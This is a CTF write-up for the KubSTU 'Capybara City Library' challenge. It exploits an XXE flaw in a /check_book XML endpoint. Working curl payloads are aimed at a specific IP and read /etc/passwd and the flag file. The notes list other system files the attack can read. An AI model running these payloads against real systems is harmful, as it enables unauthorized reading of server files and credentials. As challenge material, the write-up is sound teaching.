# Writeup: Библиотека Капибара-Сити

## Flag

`KubSTU{xxe_1s_v3ry_c0mmon_1n_capy_l1brary}`

## Solve

The "Check book" form on the homepage POSTs an XML body to `/check_book`:

```javascript
const xmlData = `<?xml version="1.0" encoding="UTF-8"?>
<book>
    <id>${id}</id>
</book>`;
fetch('/check_book', { method: 'POST', headers: {'Content-Type': 'application/xml'}, body: xmlData });
```

The server (Werkzeug 3.1.8 / Python 3.11.15 / Debian 13) parses with an external-entity-enabled XML parser. Classic XXE.

Quick read primitive:

```bash
curl -sS http://31.129.105.124/check_book \
  -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><book><id>&x;</id></book>'
# → Результат поиска: root:x:0:0:root:/root:/bin/bash …
```

The "forgotten file" hint points at `/app/flag.txt`:

```bash
curl -sS http://31.129.105.124/check_book \
  -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///app/flag.txt">]><book><id>&x;</id></book>'
# → Результат поиска: KubSTU{xxe_1s_v3ry_c0mmon_1n_capy_l1brary}
```

## Notes

- `/app/app.py` exists but contains XML-illegal bytes that crash the entity expansion (`Premature end of data … line 29`). Not needed for the flag.
- `/proc/self/cmdline` and `/proc/self/environ` fail on `Char 0x0 out of allowed range` — same illegal-byte issue.
- Useful clean reads: `/etc/passwd`, `/etc/hostname` (`ce83d87620f9`), `/etc/os-release`, `/proc/self/maps`, `/proc/1/comm` (`python`).
